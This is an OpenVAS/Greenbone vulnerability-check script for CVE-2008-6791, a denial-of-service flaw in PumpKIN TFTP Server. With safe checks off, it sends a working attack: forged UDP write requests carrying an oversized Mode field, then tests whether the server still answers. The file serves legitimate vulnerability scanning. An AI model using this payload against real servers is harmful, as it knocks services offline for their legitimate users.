# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900648");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2009-05-19 08:03:45 +0200 (Tue, 19 May 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2008-6791");
  script_name("PumpKIN TFTP Server Denial of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("secpod_pumpkin_tftp_detect.nasl", "global_settings.nasl");
  script_mandatory_keys("tftp/detected", "PumpKIN/TFTP/Ver");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/6838");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/31922");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/46122");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
  service to legitimate users.");

  script_tag(name:"affected", value:"PumpKIN TFTP Server version 2.7.2.0 and prior");

  script_tag(name:"insight", value:"Error exists when server fails handling certain input via
  sending an overly long Mode field.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"PumpKIN TFTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("version_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

if(TARGET_IS_IPV6())
  exit(0);

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

function tftp_attack(port, attack)
{
  local_var req, rep, sport, ip, udp, filter, data, i;
  if(attack) {
    req1 = crap(length:16, data:"0x00");
    req2 = crap(length:32000, data:"0x00");
    req = raw_string(0x00, 0x02) + req1 + raw_string(0x00) + req2 + raw_string(0x00);
  } else {
    vtstrings = get_vt_strings();
    req = raw_string(0x00, 0x01) + vtstrings["default"] +  raw_string(0x00) +
                                   "netascii" + raw_string(0x00);
  }

  ip = forge_ip_packet(ip_hl:5, ip_v:4, ip_tos:0, ip_len:20,
                       ip_id:rand(), ip_off:0, ip_ttl:64,
                       ip_p:IPPROTO_UDP, ip_src:this_host());

  sport = rand() % 64512 + 1024;

  udp = forge_udp_packet(ip:ip, uh_sport:sport, uh_dport:port,
                         uh_ulen: 8 + strlen(req), data:req);

  filter = 'udp and dst port ' + sport + ' and src host ' +
            get_host_ip() + ' and udp[8:1]=0x00';

  data = NULL;
  for(i = 0; i < 2; i++)
  {
    rep = send_packet(udp, pcap_active:TRUE, pcap_filter:filter);
    if(rep)
    {
      data = get_udp_element(udp: rep, element:"data");
      if(data[0] == '\0' && (data[1] == '\x03' || data[1] == '\x05')){
        return TRUE;
      }
    }
  }
  return FALSE;
}

if(!safe_checks())
{
  if(!tftp_attack(port:port, attack:FALSE))
    exit(0);

  for(i=0; i<15; i++) {
    alive = tftp_attack(port:port, attack:TRUE);
  }

  if(!tftp_attack(port:port, attack:FALSE)){
    security_message(port:port, proto:"udp");
  }
  exit(0);
}

pumpKINVer = get_kb_item("PumpKIN/TFTP/Ver");
if(pumpKINVer)
{
  if(version_is_less_equal(version:pumpKINVer, test_version:"2.7.2.0")){
    security_message(port:port, proto:"udp");
    exit(0);
  }
}

exit(99);
